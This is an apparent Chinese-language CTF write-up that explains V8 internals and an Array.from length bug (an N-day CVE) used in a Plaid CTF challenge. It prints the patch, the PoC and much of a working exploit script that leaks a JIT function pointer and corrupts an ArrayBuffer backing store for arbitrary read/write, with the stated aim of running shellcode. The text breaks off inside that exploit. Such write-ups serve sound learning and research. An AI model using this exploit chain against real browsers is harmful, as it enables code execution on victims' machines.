> 原文链接: https://www.anquanke.com//post/id/147829 


# 扔个骰子学v8 - 从Plaid CTF roll a d8开始


                                阅读量   
                                **194800**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">10</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p0.ssl.qhimg.com/t01873eaf08438a52b1.jpg)](https://p0.ssl.qhimg.com/t01873eaf08438a52b1.jpg)



## 前言

`Chrome v8`是谷歌的高性能开源js引擎，在谷歌系列浏览器当中具有举足轻重的地位。由于js的动态特性，加之现代浏览器对于运行速度的极端要求，导致js引擎的复杂度越来越高，功能也越来越强大。

在这次的`Plaid CTF`中有一道关于`v8`的题目，其实就是一个`v8`的CVE，所以需要写出一个Nday的利用。好在由于`v8`具有回归测试，所以可以很轻松的得到一个poc，之后根据poc写利用即可。但是对于完全不懂浏览器的我来说依然是一个很大的挑战。通过一段时间的研究，发现这个漏洞其实功能非常强大，所以相对比较好写利用，用这个题目来入门`v8`的利用应该是一个很好的选择了。



## v8的一些基础

js引擎的一个重要的能力，就是可以隔离。

`v8`以`Isolate`作为隔离的单位，也就是说，一个`v8`的运行实例对应了一个`Isolate`，所有运行时的信息都不能采用全局的方式，而是放置在`Isolate`里，不同的`Isolate`于是就可以对应不同的运行环境了。

### <a class="reference-link" name="JIT%E6%9C%BA%E5%88%B6"></a>JIT机制

`v8`是一个js的引擎，js是一门动态语言，动态语言相对静态语言来说，由于类型信息的缺失，导致优化非常困难。另外，js是一种“解释性”语言，对于解释性语言来说，解释器的效率就是他运行的效率。所以，为了提高运行效率，`v8`采用了`jit compile`的机制，也就是即时编译。

在运行过程中，首先`v8`会经过一次简单的即时编译，生成字节码，这里使用的jit编译器叫做“基准编译器”(baseline compiler)，这个时候的编译优化相对较少，目的是快速的启动。之后在运行过程当中，当一段代码运行次数足够多，就会触发其他的更优化的编译器，直接编译到二进制代码，后面这个优化后的编译器叫做”TurboFan”（一直很佩服谷歌起名字的功底…)。为了实现编译到二进制代码还能够运行，很自然的导致jit代码拥有rwx权限，所以从攻击角度来说，这里就是我们的攻击目标：通过修改jit编译之后的代码，执行shellcode。

### <a class="reference-link" name="%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86%E6%9C%BA%E5%88%B6"></a>内存管理机制

`v8`中的jit机制用来提高js的运行效率，那么内存管理机制就是用来提高js运用内存的效率。

<a class="reference-link" name="%E5%9E%83%E5%9C%BE%E6%94%B6%E9%9B%86%E5%99%A8"></a>**垃圾收集器**

js是一门具有`gc`(garbage collection，垃圾收集器)的语言，也就是说对于js来说，你不需要像`C`，`C++`甚至`Rust`一样去考虑内存是如何使用的（至少大部分时候不需要），当一个对象无法再被使用的时候，就会由垃圾收集器来将这段内存进行回收。

垃圾收集器具体的算法网上有很多资料，在这里就不赘述了，对于我们利用来说其算法也不是关键。不过对于`v8`来说，其垃圾收集器的具体实现有几个特点需要关注。

首先，`v8`将动态内存(堆内存)分成了多个区域，对于垃圾收集器来说，分为了:
<li>
`new space`: 用来放新建立的对象</li>
<li>
`old pointer space`: 用来放”旧的”指针</li>
<li>
`old data space`: 用来放”旧的“数据</li>
<li>
`large object space`: 用来放占用比较大的对象</li>
<li>
`code space`: 用来放jit编译的代码</li>
<li>
`cell space, property cell space, map space`: 对我们来说暂时不重要</li>
这里出现了新旧的概念，对于新对象来说，垃圾收集器会经常性的去尝试看能不能回收，如果一个对象经历过两次回收(这里叫做scavenge)都还没有被回收，于是这个对象就会被放到旧空间当中。

从攻击的角度来讲，我们首先是需要知道`code space`的地址，因为这里是我们攻击的重点。另外，如果我们需要稳定的利用，需要将漏洞对象尽量放到`old space`当中，否则仅仅两次的scavenge就会导致对象被移动，出现不稳定的情况。不过在CTF中，我们不需要长时间保持稳定，所以可以暂时不需要进行这个工作。

如果需要对`v8`的垃圾收集进行细节的了解，可以[参考这里](http://www.jayconrod.com/posts/55/a-tour-of-v8-garbage-collection)。

<a class="reference-link" name="%E5%AF%B9%E8%B1%A1%E8%A1%A8%E7%A4%BA"></a>**对象表示**

知道了对象所放的位置，还需要知道对象本身长什么样。js的对象和其他面向对象的语言不太一样，js的对象看起来和`Python`中的字典比较像，另外js还具有一套`prototype`机制，正是用这个机制保证了面向对象的功能。除此以外，js对于性能和内存的极端要求，导致了js的对象表示方法也有一定的特殊性。另外，不仅仅是对象，对于js来说，其主要的几种基本数据结构也需要有其独特的表示方式。

Tagged Pointer

js当中，number类型都是表示为double的，也就是说，其实按照js的标准，是没有整数这个类型的，只有double，但是为了节约内存，加快运算等等的考虑，在实现的时候并没有选择这样的实现，会实现一个”小整数类型“。

除小整形(small integer, SMI)以外，其他都是指针类型，所以在区分`smi`和指针类型时，我们可以采用一种特殊的方法，即`Tagged Pointer`。`Tagged Pointer`的思想非常简单，由于在32/64位系统当中，指针存在对齐，所以指针的最后几位一定是0，那么我们就可以利用好这个0，通过0表示是`smi`，通过1表示是指针即可。(这里其实还有个小trick，就是采用0表示`smi`意味着在进行运算的时候，除了最后取结果，其他都可以直接进行运算不需要将最后一位标志位去掉)。

在`v8`中，`smi`表示为32位,最低位为标志位，用0表示该数据为`smi`，高31位为整数数值。对于指针，其末位为1，将1去掉即为指针真实值。

<a class="reference-link" name="Named%20Properties%20vs.%20Elements"></a>Named Properties vs. Elements

这里需要简单的解释两个概念：
- Named Properties: 指js对象当中，非数字索引的，例如使用字符串进行索引。
- Elements: js对象当中使用数字索引的，类似于数组一样的。
由于他们之间的区别，在`v8`进行处理的时候也会采用不同的一些手段。

<a class="reference-link" name="Hidden%20Class(Map)%20(%E9%92%88%E5%AF%B9Named%20Properties)"></a>Hidden Class(Map) (针对Named Properties)

之前提到，js的对象其实表现的效果非常像字典，字典的实现一般是采用hash表的方式，但是hash表的存取速度因为存在hash运算，是比较慢的，为了追求极致的运行速度，`v8`采用了一系列优化的手段。

首先需要提到的就是`Hidden Class`的概念，似乎有的地方也把这个叫做`Map`（也有可能是我没有参透这两个概念之间的区别，如果有问题欢迎更正）。

在静态语言当中，对象的某个属性的存取速度很快，原因是我们存取的时候直接知道某个属性位于对象的哪个位置，于是`v8`也试图采用这样的方法。但是由于js是动态语言，在动态调整属性的时候，我们并不知道属性是否存在，另外属性本身的改变也对属性在对象中的偏移有一定的影响。于是，`v8`采用`Hidden Class`，将直接存在这个对象当中的属性的信息放在`Hidden Class`当中，也就是，某个属性的偏移是多少，这种信息被放在了`Hidden Class`当中，当有新的属性加入的时候，`Hidden Class`会采用一种”转移“的手段，建立一个加入了新的属性的`Hidden Class`，之后在当前的`Hidden Class`里加入一个转移目标，指向新建立的`Hidden Class`，这样就可以实现动态的添加属性了。另外，这样做还有一个好处，当需要建立一个新的对象，使用到的属性数量名字等和现在这个对象一样，我们就可以复用`Hidden Class`了。

需要提及的是，这里讨论的主要是针对非数字索引的，如果是类似数组一样的对象，是不会采用这种方式的，其采用的方式将会在后面讨论。

在几乎所有由垃圾收集器管理的对象上，第一个属性都是`Map`，也就是这里的`Hidden Class`，从攻击角度来讲，我们其实只需要认为这个属性用来区分不同的对象类型即可。

其实除`Hidden Class`以外，`named properties`还有一些其他的表示方式，但是对于攻击来说我们暂时不需要接触到这些。如果希望有更细节了解的可以参考[这里](http://www.jayconrod.com/posts/52/a-tour-of-v8-object-representation)。

<a class="reference-link" name="Properties%20&amp;%20Elements"></a>Properties &amp; Elements

现在我们已经知道了`Hidden Class`可以用来优化一些对象，但是并不是所有对象，所有属性都可以用`Hidden Class`来进行优化的。当一个对象拥有的属性是数字作为索引（类似于数组），或者当对象的属性太多的时候，继续使用`Hidden Class`就会存在一些问题。因为一个对象在分配的时候会留出来一些空间作为可以直接存储的属性，但是这个空间是有限的，当空间使用完之后（有一些对象没有这个空间），就会需要其他动态空间用来存储属性。

所以在一个对象中，往往有两个field，分别用来存储动态的字典类型（properties）或者是动态数组类型（elements）。

<a class="reference-link" name="%E5%AF%B9%E8%B1%A1%E7%9A%84%E5%85%B7%E4%BD%93%E8%A1%A8%E7%A4%BA"></a>对象的具体表示

这里先给出一个我们在exp中会用到的对象的表示:

```
// The ArrayBuffers look like this in memory:
//
// 0x00002f5246603d31   &lt;- Map pointer
// 0x000012c543082251   &lt;- OOL Properties (empty fixed array)
// 0x000012c543082251   &lt;- JS Elements (unused, empty fixed array)
// 0x0000414100000000   &lt;- Size as SMI
// 0x000055f399d4ec40   &lt;- Pointer to backing buffer (we want to corrupt this later)
// 0x000055f399d4ec40   &lt;- Again
// 0x0000000000004141   &lt;- Size as native integer
//
// While the plain objects look like this:
//
// 0x00002f524660ae51   &lt;- Map pointer
// 0x000012c543082251   &lt;- OOL Properties (empty fixed array)
// 0x000012c543082251   &lt;- JS Elements (empty fixed array)
// 0x4242424200000000   &lt;- Inline property |a|
// 0x00002d6968926b39   &lt;- Inline property |b| (this is the pointer to |run_shellcode|)
// 0x4343434300000000   &lt;- Inline property |c|
```

这里是来源于我在赛后`irc`里找人要到的wp，原作者是`Samuel Groß`(saelo)，我还没有找到如何得到如此清晰的layout信息，关于我从源码中得到layout信息的方法会在后面分析源码地方进行阐述。

### <a class="reference-link" name="CodeStubAssembler"></a>CodeStubAssembler

由于js的效率无论怎么优化都有一定的局限，对于js的原生函数(built-in functions)来说，这些功能固定的函数就没有必要使用js编写，那么为了极端的优化，就可以使用汇编语言编写。<br>
但是汇编语言与平台相关，而浏览器可以运行在多个平台上，这样就导致同一个函数需要写多份代码。

为了解决这个问题，`v8`使用了`CodeStubAssembler`，一种可以用来生成汇编语言的”汇编器“，其使用的表示方式是一种DSL，通过编写DSL伪汇编代码，使得可以生成汇编代码，达到高效率以及跨平台的目的。



## v8：从源码的角度

在上一节里面我们知道了`v8`的一些基本要素，现在我们需要来看看源码，对应上我们所知道的东西。<br>
代码版本为(6.9.0.0)

### Isolate

代码位于[src/isolate.h](https://v8.paulfryzel.com/docs/master/isolate_8h_source.html)。<br>
这个class非常大，完全看完不是很现实，不过总的来说，通过搜索可以看到`Heap`是他的成员变量。

```
...
1412 Heap *heap_;
...
```

我们需要知道的就是`Isolate`代表了一个js实例就可以了。

### <a class="reference-link" name="%E5%A0%86%E7%AE%A1%E7%90%86%E9%83%A8%E5%88%86"></a>堆管理部分

**v8::internal::Heap**

`Heap`对象代表了一段heap，代码位于[src/heap/heap.h](https://v8.paulfryzel.com/docs/master/heap_8h_source.html)。<br>
C++的问题似乎就是当class太大的时候显得有点乱七八糟，都看不出来一个class到底有哪些成员变量。。

2254行这里可以看到一个heap当中管理的几个space

```
NewSpace* new_space_;
   OldSpace* old_space_;
   CodeSpace* code_space_;
   MapSpace* map_space_;
   LargeObjectSpace* lo_space_;
   ReadOnlySpace* read_only_space_;
   // Map from the space id to the space.
  Space* space_[LAST_SPACE + 1];
```

这里可以看出来一个不同的`Space`对应了不同的class。

**v8::internal::Space**

源码位于[src/heap/spaces.h](https://v8.paulfryzel.com/docs/master/spaces_8h_source.html)<br>
988行，可以看到保存了一个`MemoryChunk`的List:

```
base::List&lt;MemoryChunk&gt; memory_chunk_list_;
```

242行可以看到`MemoryChunk`类的一些介绍，用来表示的是一段内存。`NewSpace`等等的class都是`Space`的子类，由此可以推测出来每一个space都具有多段内存。

### <a class="reference-link" name="%E5%AF%B9%E8%B1%A1%E8%A1%A8%E7%A4%BA%E9%83%A8%E5%88%86"></a>对象表示部分

这一部分其实是最麻烦的，也是我看了最多代码的，不过都没有找到能够清晰表示出一个object的layout的地方。

<a class="reference-link" name="objects"></a>**objects**

在[src/objects.h](https://github.com/v8/v8/blob/master/src/objects.h)中有一段注释，说明了各个对象之间的关系，这里的每一个对象都表示了一个js里的对象，然而问题在于，我们依然无法从这里看出来每一个对象具体的layout是如何的。

在每个对象中都有个`layout description`，用一些常量说明了各个offset，例如`JSObject`:<br>
2784行：

```
// Layout description.
  static const int kElementsOffset = JSReceiver::kHeaderSize;
  static const int kHeaderSize = kElementsOffset + kPointerSize;

  STATIC_ASSERT(kHeaderSize == Internals::kJSObjectHeaderSize);
  static const int kMaxInObjectProperties =
      (kMaxInstanceSize - kHeaderSize) &gt;&gt; kPointerSizeLog2;
  STATIC_ASSERT(kMaxInObjectProperties &lt;= kMaxNumberOfDescriptors);
  // TODO(cbruni): Revisit calculation of the max supported embedder fields.
  static const int kMaxEmbedderFields =
      ((1 &lt;&lt; kFirstInobjectPropertyOffsetBitCount) - 1 - kHeaderSize) &gt;&gt;
      kPointerSizeLog2;
STATIC_ASSERT(kMaxEmbedderFields &lt;= kMaxInObjectProperties);
```

这里由于`JSObject`是继承于`JSReceiver`的，所以首先是`JSReceiver`的各种东西所占用的大小，用到的是`JSReceiver::kHeaderSize`，也就是说首先是`JSReceiver`的fields，之后是一个pointer，因为`kHeaderSize = kElementsOffset + kPointerSize`.

其他的object可能位于其他地方，例如`JSArrayBuffer`就没有位于`objects.h`中，不过都可以用这种方法来找出layout description。可惜这样的方法依然不能知道每一个field的具体类型和用法，这里可能需要查看其他地方的代码，目前我还没有找到。



## 回到题目

### <a class="reference-link" name="%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"></a>漏洞分析

好了，到现在，基础的部分我们已经有了一些了解，回到题目来进行一下分析。

`rollad8`这个题目对应了一个cve，patch相关的内容可以在[这里](https://chromium.googlesource.com/v8/v8/+/b5da57a06de8791693c248b7aafc734861a3785d)(google的source，可能需要非常规手段访问)找到。

根据描述:

```
Always use the runtime to set the length on an array if it doesn't match
the expected length after populating it using Array.from.

```

可以看出是length相关的问题，在这里也给出了回归测试，可以当做poc进行使用:

```
// Copyright 2018 the V8 project authors. All rights reserved.
// Use of this source code is governed by a BSD-style license that can be
// found in the LICENSE file.
// Tests that creating an iterator that shrinks the array populated by
// Array.from does not lead to out of bounds writes.
let oobArray = [];
let maxSize = 1028 * 8;
Array.from.call(function() `{` return oobArray `}`, `{`[Symbol.iterator] : _ =&gt; (
  `{`
    counter : 0,
    next() `{`
      let result = this.counter++;
      if (this.counter &gt; maxSize) `{`
        oobArray.length = 0;
        return `{`done: true`}`;
      `}` else `{`
        return `{`value: result, done: false`}`;
      `}`
    `}`
  `}`
) `}`);
assertEquals(oobArray.length, maxSize);
// iterator reset the length to 0 just before returning done, so this will crash
// if the backing store was not resized correctly.
oobArray[oobArray.length - 1] = 0x41414141;
```

这里可以看到，主要做的操作就是在iterator里将`oobArray`的length设置为了0，现在我们需要看看`Array.from`到底干了什么.

从[代码](https://chromium.googlesource.com/v8/v8/+/b5da57a06de8791693c248b7aafc734861a3785d/src/builtins/builtins-array-gen.cc)(googlesource)的1999行找到`Array.from`的实现，这里是用的`CodeStubAssembler`的形式实现的，DSL的含义算是比较清楚，所以通过猜基本也能知道是在做什么。逻辑需要仔细的读一下。

```
// 首先判断`map_function`是否可以调用
  TNode&lt;Object&gt; map_function = args.GetOptionalArgumentValue(1);
  // If map_function is not undefined, then ensure it's callable else throw.
  `{`
    Label no_error(this), error(this);
    GotoIf(IsUndefined(map_function), &amp;no_error);
    GotoIf(TaggedIsSmi(map_function), &amp;error);
    Branch(IsCallable(map_function), &amp;no_error, &amp;error);
    BIND(&amp;error);
    ThrowTypeError(context, MessageTemplate::kCalledNonCallable, map_function);
    BIND(&amp;no_error);
  `}`
  ...
// 查看[Symbol.iterator]是不是定义了
IteratorBuiltinsAssembler iterator_assembler(state());
  Node* iterator_method =
      iterator_assembler.GetIteratorMethod(context, array_like);
  Branch(IsNullOrUndefined(iterator_method), &amp;not_iterable, &amp;iterable);

  // 可以进行迭代的情况
BIND(&amp;iterable);
    `{`
    ...
    // 检验方法是否可以调用，可以调用则跳到next
   // Check that the method is callable.
    `{`
      Label get_method_not_callable(this, Label::kDeferred), next(this);
      GotoIf(TaggedIsSmi(iterator_method), &amp;get_method_not_callable);
      GotoIfNot(IsCallable(iterator_method), &amp;get_method_not_callable);
      Goto(&amp;next);
      BIND(&amp;get_method_not_callable);
      ThrowTypeError(context, MessageTemplate::kCalledNonCallable,
                     iterator_method);
      BIND(&amp;next);
    `}`
    // 进行一些初始化，这里创建了一个length为0的数组
    // Construct the output array with empty length.
    array = ConstructArrayLike(context, args.GetReceiver());
    // Actually get the iterator and throw if the iterator method does not yield
    // one.
    IteratorRecord iterator_record =
        iterator_assembler.GetIterator(context, items, iterator_method);
    TNode&lt;Context&gt; native_context = LoadNativeContext(context);
    TNode&lt;Object&gt; fast_iterator_result_map =
        LoadContextElement(native_context, Context::ITERATOR_RESULT_MAP_INDEX);
    Goto(&amp;loop);
    // loop，进入循环
    BIND(&amp;loop);
    `{`
    ...
    BIND(&amp;loop_done);
    `{`
      length = index;
      // 循环完成时候跳到finished
      Goto(&amp;finished);
    `}`
    `}`

  // 无法迭代的情况
  BIND(&amp;not_iterable);
  `{`
  ...
  `}`


  BIND(&amp;finished);
  // Finally set the length on the output and return it.
  GenerateSetLength(context, array.value(), length.value());
  args.PopAndReturn(array.value());
```

主要关注的点在于2189行的`GenerateSetLength`，继续跟踪这个函数，找到1945行的实现，再结合patch，patch里更改了1979行的跳转：

```
@@ -1945,10 +1945,13 @@
   void GenerateSetLength(TNode&lt;Context&gt; context, TNode&lt;Object&gt; array,
                          TNode&lt;Number&gt; length) `{`
     Label fast(this), runtime(this), done(this);
+    // TODO(delphick): We should be able to skip the fast set altogether, if the
+    // length already equals the expected length, which it always is now on the
+    // fast path.
     // Only set the length in this stub if
     // 1) the array has fast elements,
     // 2) the length is writable,
-    // 3) the new length is greater than or equal to the old length.
+    // 3) the new length is equal to the old length.

     // 1) Check that the array has fast elements.
     // TODO(delphick): Consider changing this since it does an an unnecessary
@@ -1970,10 +1973,10 @@
       // BranchIfFastJSArray above.
       EnsureArrayLengthWritable(LoadMap(fast_array), &amp;runtime);

-      // 3) If the created array already has a length greater than required,
+      // 3) If the created array's length does not match the required length,
       //    then use the runtime to set the property as that will insert holes
-      //    into the excess elements and/or shrink the backing store.
-      GotoIf(SmiLessThan(length_smi, old_length), &amp;runtime);
+      //    into excess elements or shrink the backing store as appropriate.
+      GotoIf(SmiNotEqual(length_smi, old_length), &amp;runtime);

       StoreObjectFieldNoWriteBarrier(fast_array, JSArray::kLengthOffset,
                                      length_smi);
```

将`SmiLessThan`改为了`SmiNotEqual`，好了我们现在可以分析一下到底出了什么问题了。<br>`GenerateSetLength`是在最后进行长度设置的，决定了有多少长度可以被访问。<br>
看看`GenerateSetLength`的逻辑：

```
...
TNode&lt;JSArray&gt; fast_array = CAST(array);
// 根据在Array.from中的goto finished之前的语句，length = index，这里的length其实就是迭代了多少次
// 才结束
TNode&lt;Smi&gt; length_smi = CAST(length);
// 获取到现在array的length，作为old_length
TNode&lt;Smi&gt; old_length = LoadFastJSArrayLength(fast_array);
...
// 如果length_smi &lt; old_length，则跳到runtime，runtime会进行需要进行分配或者缩减内存的length改动
      GotoIf(SmiLessThan(length_smi, old_length), &amp;runtime);
      // 这里直接改动了length，但是没有进行内存的分配或者缩减
      StoreObjectFieldNoWriteBarrier(fast_array, JSArray::kLengthOffset,
                                     length_smi);
      Goto(&amp;done);
    BIND(&amp;runtime);
    `{`
      CallRuntime(Runtime::kSetProperty, context, static_cast&lt;Node*&gt;(array),
                  CodeStubAssembler::LengthStringConstant(), length,
                  SmiConstant(LanguageMode::kStrict));
      Goto(&amp;done);
    `}`
    BIND(&amp;done);
  `}`
```

这里可以看到，当`length_smi &gt;= old_length`的时候，也就是迭代的次数比数组的长度要多的时候，length会直接被改变，而没有进行内存的增减。这是由于在进行迭代的时候，我们建立了一个empty的array，之后迭代的结果会放进这个array里，并且放进去的时候都会导致length变大，如果这个临时array比原来的array还要大，那我们就不需要再把内存缩小，就可以放得下。

这样的逻辑乍一看似乎没有问题，但是开发者没有考虑到，**如果在迭代过程中，原来array的长度被改变了**，就会出现问题了。

在迭代最后一轮当中将原来数组length改小，导致比迭代次数要少，于是内存会被缩减，最后检查的时候发现迭代次数大于`old_length`，就将length改大，但是内存空间依然只有被改小的`old_length`那么多是属于我们的，于是现在我们可以访问不属于我们的内存，造成了oob(out of bounds, 溢出).

这里的溢出并没有限制功能，我们可以对后面的内存进行读或者写，所以是一个非常强的漏洞了。

### <a class="reference-link" name="%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF"></a>利用思路

到现在位置，我们已经理解了漏洞的成因，并且知道了漏洞会造成oob读写，接下来思考一下怎么利用。

总的来说，利用思路应该是泄露jit的函数指针，改写jit函数的内容为shellcode，最终调用被改写之后的jit函数。不过首先我们需要解决：
1. 如何泄露指针
1. 如何造成任意地址读写
这里需要提一下，之所以我们需要任意地址读写，是因为我们控制的范围有限，以及jit的函数指针的泄露上，不是直接泄露出jit函数的对象就可以的，还需要通过对象找到真正的函数指针。

泄露指针环节，可以利用js object，通过把jit的函数放到对象中，只要能找到对象，就能找到这个属性，也就是那个jit的函数。

至于任意地址读写，方法其实就是利用`ArrayBuffer`的`backing store`，`backing store`类似于一段裸内存，于是我们只要能够修改到这个field，就可以利用`ArrayBuffer`来进行任意读写了。

### <a class="reference-link" name="%E5%88%A9%E7%94%A8%E4%BB%A3%E7%A0%81"></a>利用代码

参考了saelo的利用代码

```
//
// Utility functions.
//

// Return the hexadecimal representation of the given byte.
function hex(b) `{`
    return ('0' + b.toString(16)).substr(-2);
`}`

// Return the hexadecimal representation of the given byte array.
function hexlify(bytes) `{`
    var res = [];
    for (var i = 0; i &lt; bytes.length; i++)
        res.push(hex(bytes[i]));

    return res.join('');
`}`

// Return the binary data represented by the given hexdecimal string.
function unhexlify(hexstr) `{`
    if (hexstr.length % 2 == 1)
        throw new TypeError("Invalid hex string");

    var bytes = new Uint8Array(hexstr.length / 2);
    for (var i = 0; i &lt; hexstr.length; i += 2)
        bytes[i/2] = parseInt(hexstr.substr(i, 2), 16);

    return bytes;
`}`

function hexdump(data) `{`
    if (typeof data.BYTES_PER_ELEMENT !== 'undefined')
        data = Array.from(data);

    var lines = [];
    for (var i = 0; i &lt; data.length; i += 16) `{`
        var chunk = data.slice(i, i+16);
        var parts = chunk.map(hex);
        if (parts.length &gt; 8)
            parts.splice(8, 0, ' ');
        lines.push(parts.join(' '));
    `}`

    return lines.join('n');
`}`

// Simplified version of the similarly named python module.
var Struct = (function() `{`
    // Allocate these once to avoid unecessary heap allocations during pack/unpack operations.
    var buffer      = new ArrayBuffer(8);
    var byteView    = new Uint8Array(buffer);
    var uint32View  = new Uint32Array(buffer);
    var float64View = new Float64Array(buffer);

    return `{`
        pack: function(type, value) `{`
            var view = type;        // See below
            view[0] = value;
            return new Uint8Array(buffer, 0, type.BYTES_PER_ELEMENT);
        `}`,

        unpack: function(type, bytes) `{`
            if (bytes.length !== type.BYTES_PER_ELEMENT)
                throw Error("Invalid bytearray");

            var view = type;        // See below
            byteView.set(bytes);
            return view[0];
        `}`,

        // Available types.
        int8:    byteView,
        int32:   uint32View,
        float64: float64View
    `}`;
`}`)();

//
// Tiny module that provides big (64bit) integers.
//
// Copyright (c) 2016 Samuel Groß
//
// Requires utils.js
//

// Datatype to represent 64-bit integers.
//
// Internally, the integer is stored as a Uint8Array in little endian byte order.
function Int64(v) `{`
    // The underlying byte array.
    var bytes = new Uint8Array(8);

    switch (typeof v) `{`
        case 'number':
            v = '0x' + Math.floor(v).toString(16);
        case 'string':
            if (v.startsWith('0x'))
                v = v.substr(2);
            if (v.length % 2 == 1)
                v = '0' + v;

            var bigEndian = unhexlify(v, 8);
            bytes.set(Array.from(bigEndian).reverse());
            break;
        case 'object':
            if (v instanceof Int64) `{`
                bytes.set(v.bytes());
            `}` else `{`
                if (v.length != 8)
                    throw TypeError("Array must have excactly 8 elements.");
                bytes.set(v);
            `}`
            break;
        case 'undefined':
            break;
        default:
            throw TypeError("Int64 constructor requires an argument.");
    `}`

    // Return a double whith the same underlying bit representation.
    this.asDouble = function() `{`
        // Check for NaN
        if (bytes[7] == 0xff &amp;&amp; (bytes[6] == 0xff || bytes[6] == 0xfe))
            throw new RangeError("Integer can not be represented by a double");

        return Struct.unpack(Struct.float64, bytes);
    `}`;

    // Return a javascript value with the same underlying bit representation.
    // This is only possible for integers in the range [0x0001000000000000, 0xffff000000000000)
    // due to double conversion constraints.
    this.asJSValue = function() `{`
        if ((bytes[7] == 0 &amp;&amp; bytes[6] == 0) || (bytes[7] == 0xff &amp;&amp; bytes[6] == 0xff))
            throw new RangeError("Integer can not be represented by a JSValue");

        // For NaN-boxing, JSC adds 2^48 to a double value's bit pattern.
        this.assignSub(this, 0x1000000000000);
        var res = Struct.unpack(Struct.float64, bytes);
        this.assignAdd(this, 0x1000000000000);

        return res;
    `}`;

    // Return the underlying bytes of this number as array.
    this.bytes = function() `{`
        return Array.from(bytes);
    `}`;

    // Return the byte at the given index.
    this.byteAt = function(i) `{`
        return bytes[i];
    `}`;

    // Return the value of this number as unsigned hex string.
    this.toString = function() `{`
        return '0x' + hexlify(Array.from(bytes).reverse());
    `}`;

    // Basic arithmetic.
    // These functions assign the result of the computation to their 'this' object.

    // Decorator for Int64 instance operations. Takes care
    // of converting arguments to Int64 instances if required.
    function operation(f, nargs) `{`
        return function() `{`
            if (arguments.length != nargs)
                throw Error("Not enough arguments for function " + f.name);
            for (var i = 0; i &lt; arguments.length; i++)
                if (!(arguments[i] instanceof Int64))
                    arguments[i] = new Int64(arguments[i]);
            return f.apply(this, arguments);
        `}`;
    `}`

    // this = -n (two's complement)
    this.assignNeg = operation(function neg(n) `{`
        for (var i = 0; i &lt; 8; i++)
            bytes[i] = ~n.byteAt(i);

        return this.assignAdd(this, Int64.One);
    `}`, 1);

    // this = a + b
    this.assignAdd = operation(function add(a, b) `{`
        var carry = 0;
        for (var i = 0; i &lt; 8; i++) `{`
            var cur = a.byteAt(i) + b.byteAt(i) + carry;
            carry = cur &gt; 0xff | 0;
            bytes[i] = cur;
        `}`
        return this;
    `}`, 2);

    // this = a - b
    this.assignSub = operation(function sub(a, b) `{`
        var carry = 0;
        for (var i = 0; i &lt; 8; i++) `{`
            var cur = a.byteAt(i) - b.byteAt(i) - carry;
            carry = cur &lt; 0 | 0;
            bytes[i] = cur;
        `}`
        return this;
    `}`, 2);
`}`

// Constructs a new Int64 instance with the same bit representation as the provided double.
Int64.fromDouble = function(d) `{`
    var bytes = Struct.pack(Struct.float64, d);
    return new Int64(bytes);
`}`;

// Convenience functions. These allocate a new Int64 to hold the result.

// Return -n (two's complement)
function Neg(n) `{`
    return (new Int64()).assignNeg(n);
`}`

// Return a + b
function Add(a, b) `{`
    return (new Int64()).assignAdd(a, b);
`}`

// Return a - b
function Sub(a, b) `{`
    return (new Int64()).assignSub(a, b);
`}`

// Some commonly used numbers.
Int64.Zero = new Int64(0);
Int64.One = new Int64(1);

// Exploitation

let bufs = [];
let objs = [];

// 我们要写的jit函数
function func_to_overwrite() `{`
    let sum = 0;
    for (let i = 0;i &lt; 0x100; i++) `{`
        sum += i;
    `}`
    return sum;
`}`


// 多次运行函数，使得函数被jit编译
for (let i = 0;i &lt; 1000;i++) `{`
    func_to_overwrite();
`}`

%DebugPrint(func_to_overwrite);

// 让oobArray为double类型的，方便读取
let oobArray = [1.1];
let maxSize = 1028 * 8;
Array.from.call(function() `{` return oobArray `}`, `{`[Symbol.iterator] : _ =&gt; (
  `{`
    counter : 0,
    next() `{`
      let result = this.counter++;
      if (this.counter &gt; maxSize) `{`
        // 注意这里length不能为0，会报错，可能原因是为0被回收之后被重新分配了
        // （没有深究原因）
        oobArray.length = 5;
        for (let i = 0;i &lt; 100;i++) `{`
            bufs.push(new ArrayBuffer(0x1234));
            // 这里用0xdead标志后面的属性为jit函数对象的指针
            let obj = `{`'a': 0x4321, 'b': func_to_overwrite`}`;
            //%DebugPrint(obj);
            objs.push(obj);
        `}`
        return `{`done: true`}`;
      `}` else `{`
        return `{`value: result, done: false`}`;
      `}`
    `}`
  `}`
) `}`);

let jit_func_obj_ptr = 0;

// 现在我们可以越界访问了
// 首先需要泄露jit对象指针的地址
for (let i = 0;i &lt; maxSize; i++) `{`
    // 越界搜索obj的标志
    let val = Int64.fromDouble(oobArray[i]);
    if (val == 0x432100000000) `{`
        console.log('found');
        jit_func_obj_ptr = Int64.fromDouble(oobArray[i + 1]) - 1;
        console.log('jit func pointer: ' + jit_func_obj_ptr);
        break;
    `}`
`}`

if (jit_func_obj_ptr === 0) `{`
    throw new Error("jit func not found");
`}`

// 接下来需要更改backing store导致任意读写

let changed_idx = 0;

// 同样需要先找到我们能更改的值
for (let i = 0;i &lt; maxSize; i++) `{`
    let val = Int64.fromDouble(oobArray[i]);
    if (val == 0x123400000000) `{`
        console.log('found array buffer');
        // 更改一下array buffer的length，这样我们就可以知道是哪个
        // array buffer被改动了
        changed_idx = i;
        oobArray[i] = (new Int64(0x121200000000)).asDouble();
        oobArray[i + 3] = (new Int64(0x1212)).asDouble();
        break;
    `}`
`}`

if (changed_idx === 0) `{`
    throw new Error("array buffer not found");
`}`

let arw = null;

for (let i = 0;i &lt; bufs.length; i++) `{`
    if (bufs[i].byteLength == 0x1212) `{`
        // 找到了改动之后的buffer
        console.log('changed buffer found');

        // 封装成一个用来进行任意读写的object
        class ArbitraryReadWrite `{`
            constructor(changed_idx_oob, changed_idx_bufs) `{`
                this.idx_in_oob_arr = changed_idx_oob;
                this.idx_in_bufs_arr = changed_idx_bufs;
            `}`

            read(addr) `{`
                // 更改backing store
                let i = this.idx_in_oob_arr;
                oobArray[i + 1] = addr.asDouble();
                //%DebugPrint(bufs[this.idx_in_bufs_arr]);
